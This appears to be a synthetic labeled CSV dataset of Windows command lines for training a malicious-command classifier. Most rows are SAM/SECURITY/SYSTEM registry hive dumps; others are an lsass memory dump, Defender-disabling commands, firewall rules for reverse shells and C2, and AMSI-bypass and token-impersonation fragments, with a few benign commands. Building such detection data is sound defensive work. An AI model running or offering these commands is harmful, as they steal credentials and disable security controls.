text,label
"cmd.exe /c ""reg query hkcu\console""",0
reg export hklm\security c:\windows\temp\0a2iykht.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ftdclqvv.dat""",1
reg save hklm\security c:\windows\temp\pz0njsmg.save,1
reg save hklm\security c:\windows\temp\fit3wedp.save,1
reg export hklm\sam c:\windows\temp\qtsmhd05.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\ryfyrpo8.dat""",1
reg export hklm\system c:\windows\temp\ux1vwi27.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\tmsl3wm0.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\18q5p2xx.dat""""",1
reg export hklm\sam c:\windows\temp\vd9xcto1.save,1
reg  export  hklm\sam  c:\windows\temp\eoz4eo8c.save,1
reg export hklm\system c:\windows\temp\359x5erd.save,1
reg export hklm\sam c:\windows\temp\rqexvw2c.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\kay7vv5p.dat""",1
reg export hklm\system c:\windows\temp\aufu565z.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\66dake92.dat""",1
reg export hklm\system c:\windows\temp\3o2eswyf.save,1
reg export hklm\sam c:\windows\temp\bsjiv75n.save,1
"powershell -nop -c ""ping   8.8.8.8""",0
reg export hklm\security c:\windows\temp\bdszwssh.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\e0zhytwo.dat""",1
reg export hklm\security c:\windows\temp\9gkwopnv.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\bl7ibnvp.dat""",1
reg export hklm\security c:\windows\temp\63x7d3ve.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\4901xx6o.dat""",1
"[dllimport(""advapi32.dll"")] extern bool impersonateloggedonuser(...)",3
reg save hklm\security c:\windows\temp\tma2yuwd.save,1
reg export hklm\security c:\windows\temp\ldbzcjho.save,1
reg save hklm\security c:\windows\temp\xwaz8nd9.save,1
reg save hklm\sam c:\windows\temp\ebdb5jd9.save,1
reg export hklm\security c:\windows\temp\w0nmcxiz.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\i04g537m.dat""",1
reg export hklm\system c:\windows\temp\8qrosscn.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\98aw0vu4.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\rbcuzs7i.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\l64lvssd.dat""",1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\ol0gi8m7.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\qyoe5day.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\1va2rh7i.dat""",1
reg export hklm\sam c:\windows\temp\xo6yc7i8.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\w819ph77.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\u02nuga1.dat""",1
reg export hklm\system c:\windows\temp\2oacaa4g.save,1
reg export hklm\sam c:\windows\temp\l3gsb5xl.save,1
reg save hklm\system c:\windows\temp\uvjt0k34.save,1
rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"powershell -nop -c ""reg export hklm\sam c:\temp\5ehzcgu7.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\3astdoao.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\9b8hqi1q.dat""",1
reg export hklm\system c:\windows\temp\9amj4jt4.save,1
reg save hklm\security c:\windows\temp\1795flw0.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\qteve7gm.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\y9iqk0y1.dat""",1
reg export hklm\system c:\windows\temp\2yixuav3.save,1
reg  export  hklm\sam  c:\windows\temp\pd1edni3.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\oalzj2am.dat""",1
reg save hklm\system c:\windows\temp\36o0wsmr.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\rdcjw0gk.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\90zvg5sq.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\u0jvz3s5.dat""",1
reg export hklm\security c:\windows\temp\s2rkdman.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\1yghu6dj.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\scrwgsnf.dat""",1
reg save hklm\security c:\windows\temp\8396tswj.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\adq01h70.dat""",1
reg save hklm\security c:\windows\temp\sig5d9a7.save,1
reg export hklm\system c:\windows\temp\62xu09r9.save,1
reg save hklm\sam c:\windows\temp\kdutfz8s.save,1
reg export hklm\security c:\windows\temp\5xgmr67q.save,1
reg export hklm\security c:\windows\temp\sqsh29oo.save,1
reg save hklm\sam c:\windows\temp\vilq7n8v.save,1
reg save hklm\security c:\windows\temp\ky1ym9rc.save,1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\security c:\temp\l8t8vph6.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\ak487z7u.dat""",1
reg export hklm\security c:\windows\temp\uw2il6vl.save,1
reg save hklm\security c:\windows\temp\ygu1zoes.save,1
"[dllimport(""advapi32.dll"")]   extern   bool   duplicatetokenex(...)",3
"powershell -nop -c ""reg export hklm\sam c:\temp\ach68fzx.dat""",1
reg save hklm\security c:\windows\temp\9uixr2m4.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ld4mv92v.dat""",1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg save hklm\security c:\windows\temp\4b087tdv.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\h6s3g19j.dat""",1
reg save hklm\sam c:\windows\temp\gz13el0f.save,1
reg save hklm\sam c:\windows\temp\d7cu9wqo.save,1
reg save hklm\system c:\windows\temp\9sqoyta7.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\u20nh6mp.dat""",1
reg export hklm\sam c:\windows\temp\811h2rkn.save,1
reg export hklm\sam c:\windows\temp\4ig44nqr.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\9ubq2z3j.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\85qb3n8f.dat""",1
"cmd.exe /c ""$a   =   [ref].assembly.gettype('system.management.automation.amsiutils')""",3
reg save hklm\system c:\windows\temp\z60nbyu4.save,1
reg save hklm\sam c:\windows\temp\qf8ho3z2.save,1
reg save hklm\sam c:\windows\temp\qk84kjoe.save,1
reg  save  hklm\security  c:\windows\temp\5gm3mmgs.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\4fnzdgza.dat""",1
"powershell -nop -c ""reg   query   hkcu\console""",0
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\gwtcxkv0.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\e85l29ay.dat""",1
reg export hklm\system c:\windows\temp\4lrlqzdr.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\23p54eb0.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\0ohv1r76.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\lzv68x22.dat""",1
reg export hklm\system c:\windows\temp\qwxrmimo.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\43yzsdbv.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\6xrcg5kf.dat""",1
reg export hklm\sam c:\windows\temp\1xqhgo0o.save,1
reg  save  hklm\system  c:\windows\temp\8sw0r3y0.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\byazygjz.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\nzukt52w.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\s7xcgs2s.dat""",1
rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
"powershell -nop -c ""reg save hklm\sam c:\temp\gy9cpmmn.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\jy1zobtf.dat""",1
reg save hklm\sam c:\windows\temp\m158tf3x.save,1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\5wb6j6f7.save""",1
reg save hklm\system c:\windows\temp\iwnmcpky.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\v3pftcb7.dat""",1
reg export hklm\security c:\windows\temp\fm2verx4.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\2uynmrfm.dat""""",1
reg save hklm\security c:\windows\temp\5sv6hnaj.save,1
reg save hklm\sam c:\windows\temp\hbyqln1g.save,1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\w38itmd6.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\4bowqbqb.dat""",1
reg export hklm\security c:\windows\temp\gu9ocdwg.save,1
reg save hklm\security c:\windows\temp\sk0ldlmh.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\giqtmafg.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\dmdmb3s2.dat""",1
reg save hklm\sam c:\windows\temp\78a3api4.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\yw0v5odz.dat""",1
reg export hklm\security c:\windows\temp\1xcp7g4p.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\a7m6v417.dat""",1
reg save hklm\sam c:\windows\temp\fcudfinh.save,1
reg  save  hklm\sam  c:\windows\temp\2ckxh8aj.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\r2yh27vh.dat""",1
"cmd.exe /c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\system c:\windows\temp\ticb3kb0.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\1dwbuvq6.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\7oab8qzh.dat""",1
reg export hklm\sam c:\windows\temp\5w45btaa.save,1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg export hklm\sam c:\windows\temp\0fvb3nv1.save,1
reg save hklm\security c:\windows\temp\e91123kk.save,1
reg save hklm\sam c:\windows\temp\7n9sbaxp.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\oytnvpum.dat""",1
reg   export   hklm\system   c:\windows\temp\97sz7k82.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\gc7aauii.dat""",1
reg export hklm\system c:\windows\temp\aqkjsbat.save,1
reg save hklm\sam c:\windows\temp\m16p4o53.save,1
reg export hklm\security c:\windows\temp\2cd3iyc6.save,1
reg export hklm\sam c:\windows\temp\9jplpbzu.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\41s38pk0.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\1m7bjsav.dat""",1
reg export hklm\system c:\windows\temp\umuw45h3.save,1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\a6s4ym8e.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\security c:\temp\29ynw3jo.dat""""",1
reg export hklm\security c:\windows\temp\n6yr2ljy.save,1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\i38114d3.save""",1
reg save hklm\system c:\windows\temp\m9subvnb.save,1
rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\s4iqt9by.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\0wcce5ai.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\lbzt1fq5.dat""",1
"rundll32.exe   c:\windows\system32\comsvcs.dll,   minidump   1234   c:\temp\lsass.dmp   full",1
"cmd.exe /c ""reg export hklm\sam c:\temp\967kr619.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\x7d4tnh2.dat""",1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\ydcntc7z.dat""",1
"cmd.exe /c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\berdnmgu.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\3rpxhaf3.dat""""",1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]   extern   bool   amsiutils(...)""",3
reg export hklm\security c:\windows\temp\o5lr8nzb.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\htjj2e7p.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\tivto8mc.dat""",1
reg export hklm\sam c:\windows\temp\titzrup8.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\xeedsgc3.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\d4pcndu0.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\sam c:\temp\bnq70m5t.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\nntp2t6u.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\em07ejxw.dat""",1
reg  save  hklm\system  c:\windows\temp\43ssadbn.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\jgsh7ujb.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\5fb4oxy1.dat""",1
reg export hklm\system c:\windows\temp\5wyge8ib.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\lw5pecfu.dat""",1
reg export hklm\sam c:\windows\temp\wbwhftwp.save,1
reg save hklm\security c:\windows\temp\8a1zjk1x.save,1
reg export hklm\security c:\windows\temp\6ukyddnl.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\8mfknwgk.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\twju45hz.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\6rebkhkt.dat""",1
reg export hklm\system c:\windows\temp\ucqay265.save,1
reg export hklm\sam c:\windows\temp\4e6opc7t.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\z4xv875y.dat""",1
"cmd.exe /c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\security c:\windows\temp\pnpwaqgl.save,1
reg save hklm\security c:\windows\temp\fdtgz3o8.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\olowa2ws.dat""",1
reg save hklm\sam c:\windows\temp\n5nmuloj.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\xrboxcc1.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\wm8uguiy.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\uyf5omnn.dat""",1
reg save hklm\system c:\windows\temp\icytomee.save,1
"powershell -nop -c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""reg save hklm\security c:\temp\4gpbaeuf.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\40oya8uq.dat""",1
reg export hklm\system c:\windows\temp\s36e9ruj.save,1
$a  =  [ref].assembly.gettype('system.management.automation.amsiutils'),3
"powershell -nop -c ""reg export hklm\security c:\temp\h6cmd49m.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\x77u28xb.dat""",1
set-mppreference  -disablerealtimemonitoring  $true,2
reg save hklm\security c:\windows\temp\s69d24em.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\h2i01p00.dat""",1
reg save hklm\system c:\windows\temp\a6owrdcl.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\r66gdc6g.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\paihv8nd.dat""",1
reg export hklm\sam c:\windows\temp\nh9decqx.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\wnw81d5x.dat""",1
reg export hklm\security c:\windows\temp\yzarlk3p.save,1
reg save hklm\system c:\windows\temp\xrgug3ky.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\237yv8g1.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\aaug7bf6.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\7yld5kpf.dat""",1
reg save hklm\system c:\windows\temp\laa4domz.save,1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\at3l79wx.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\g5m1fbq9.dat""",1
reg save hklm\sam c:\windows\temp\vye034fp.save,1
reg export hklm\sam c:\windows\temp\5hrb7era.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\iqfpuwd4.dat""",1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\mjjnegih.save""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\47p7rfy5.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\o9hhw1mv.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\mx1lftrc.dat""",1
reg export hklm\system c:\windows\temp\f0760yps.save,1
"cmd.exe /c ""wmic  product  get  name,  version""",0
"cmd.exe /c ""reg save hklm\sam c:\temp\45b7enjr.dat""",1
reg save hklm\security c:\windows\temp\o16ff84i.save,1
reg save hklm\sam c:\windows\temp\zvd5u719.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\46foeor6.dat""""",1
reg export hklm\security c:\windows\temp\n28iw39m.save,1
reg save hklm\security c:\windows\temp\byxh9oh1.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
sc   query   windefend,0
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"powershell -nop -c ""reg export hklm\security c:\temp\f4v1l2fw.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\0rblerxa.dat""",1
reg save hklm\system c:\windows\temp\hm7m09vc.save,1
reg save hklm\sam c:\windows\temp\6e6s3ilj.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\0a2wl8ph.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ont9oqh5.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\4o8hpuve.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\prjoo723.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\0l0norp2.dat""",1
reg save hklm\system c:\windows\temp\jji1mfxy.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ld8e5o6x.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ehoms46s.dat""",1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\ltszelix.save""",1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\4jg8dzxz.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\vxkleijz.dat""",1
reg save hklm\sam c:\windows\temp\ie83b2ue.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\jtje7lmj.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\2azlc38l.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\dapw4a07.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\a0u492d0.dat""",1
reg export hklm\system c:\windows\temp\4aquo4ur.save,1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\vbaa0vrx.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\j6kt7j4j.dat""",1
reg save hklm\security c:\windows\temp\s4zz74ak.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\5pohoais.dat""""",1
reg export hklm\sam c:\windows\temp\t95tek18.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\si7v4bzf.dat""",1
rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
reg save hklm\sam c:\windows\temp\vyhy4sab.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\saot1mmo.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\11l9iu3v.dat""",1
"cmd.exe /c ""$a   =   [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\x4d1k3tl.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\u75nrg10.dat""",1
reg save hklm\system c:\windows\temp\z8614fsj.save,1
reg save hklm\system c:\windows\temp\3bfaxx1b.save,1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\kr84twma.dat""",1
rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444,2
"cmd.exe /c ""netsh  dump  >  netconfig.txt""",0
reg save hklm\security c:\windows\temp\yaja0iey.save,1
"cmd.exe /c ""rule: exfil data | app: any | dir: outbound | act: allow | port: 4444""",2
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\9henchgr.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\cyzlkurw.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\8fcptmy4.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\0cmpobar.dat""",1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\ae13khgq.save""",1
reg save hklm\security c:\windows\temp\4wqqa6wl.save,1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\security c:\temp\i3he6sll.dat""""",1
reg save hklm\security c:\windows\temp\cl0fz2gm.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\h11nl9pa.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\aet6q06y.dat""",1
reg save hklm\system c:\windows\temp\4alyn18c.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\5afakf1y.dat""",1
reg export hklm\sam c:\windows\temp\j02whhx0.save,1
reg export hklm\security c:\windows\temp\lsgjlieo.save,1
reg export hklm\system c:\windows\temp\ofw2slao.save,1
reg save hklm\sam c:\windows\temp\ry8quo7o.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\zacz6z2g.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\7ntpr4wm.dat""",1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\7hx9lx0t.save""",1
rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337,2
reg save hklm\sam c:\windows\temp\zuieqb1x.save,1
reg export hklm\sam c:\windows\temp\48adadua.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\1t9faqhs.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\3y6u5jgu.dat""",1
reg save hklm\sam c:\windows\temp\v7pf7b11.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\4r8bq6d2.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\gygkqz5z.dat""",1
reg save hklm\system c:\windows\temp\03snkhdj.save,1
reg export hklm\sam c:\windows\temp\gf321v6v.save,1
reg save hklm\system c:\windows\temp\v129vlr7.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\fgl8eaa8.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\q7qrd97v.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\2v4fv4hd.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\oeuykl12.dat""",1
reg save hklm\security c:\windows\temp\6nhaschk.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\bh8qi2xa.dat""",1
reg export hklm\system c:\windows\temp\cy5zs6t8.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\234u0aso.dat""",1
reg save hklm\sam c:\windows\temp\ezak1qva.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")] extern bool amsiutils(...)""",3
"cmd.exe /c ""reg save hklm\security c:\temp\cgnpzfpb.dat""",1
ipconfig   /all,0
"powershell -nop -c ""reg export hklm\security c:\temp\ctl5906l.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\xxq52dbx.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\r7w96o7a.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\nei24t4j.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\wl4nqkaa.dat""",1
reg save hklm\sam c:\windows\temp\ghu06dcd.save,1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\bjtfog0b.dat""",1
sc stop windefend,2
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\yiig4mpo.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\8v21ut2b.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\fbm2ishx.dat""",1
reg save hklm\security c:\windows\temp\43zlklci.save,1
reg export hklm\system c:\windows\temp\ymu45qvs.save,1
reg save hklm\sam c:\windows\temp\e0a66dhd.save,1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\security c:\temp\oxjidso9.dat""""",1
reg export hklm\sam c:\windows\temp\qzh74wiz.save,1
reg export hklm\security c:\windows\temp\jsv3gw57.save,1
reg save hklm\system c:\windows\temp\s40nk14v.save,1
reg export hklm\system c:\windows\temp\9dvbfnen.save,1
"powershell -nop -c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: 4444""",2
reg save hklm\sam c:\windows\temp\clarkx6b.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\rkijazot.dat""",1
reg   save   hklm\sam   c:\windows\temp\l9upg5z9.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\wmdrysxu.dat""",1
reg save hklm\sam c:\windows\temp\as2mmjqh.save,1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\jzpxgdj1.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\w568hwcj.dat""",1
reg export hklm\security c:\windows\temp\axunletk.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\84o3io3s.dat""",1
reg save hklm\sam c:\windows\temp\fy7q1dj3.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\g9u1k6x0.dat""",1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\lnthvi4x.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\3fj1ihp8.dat""",1
reg export hklm\sam c:\windows\temp\3bp7v2bt.save,1
reg export hklm\system c:\windows\temp\ydmz0fpy.save,1
reg export hklm\security c:\windows\temp\64sc9pn8.save,1
reg save hklm\sam c:\windows\temp\bor00z0x.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"cmd.exe /c ""reg save hklm\security c:\temp\2f3gykcc.dat""",1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]   extern   bool   openprocesstoken(...)""",3
reg export hklm\sam c:\windows\temp\6hjdmd9v.save,1
reg save hklm\security c:\windows\temp\qjkdbutz.save,1
reg save hklm\system c:\windows\temp\roykplcb.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\jrfexfqe.dat""",1
"cmd.exe /c ""netsh advfirewall firewall add rule name=""bad"" action=allow protocol=any port=4444""",2
"cmd.exe /c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""reg save hklm\security c:\temp\ohwav37n.dat""",1
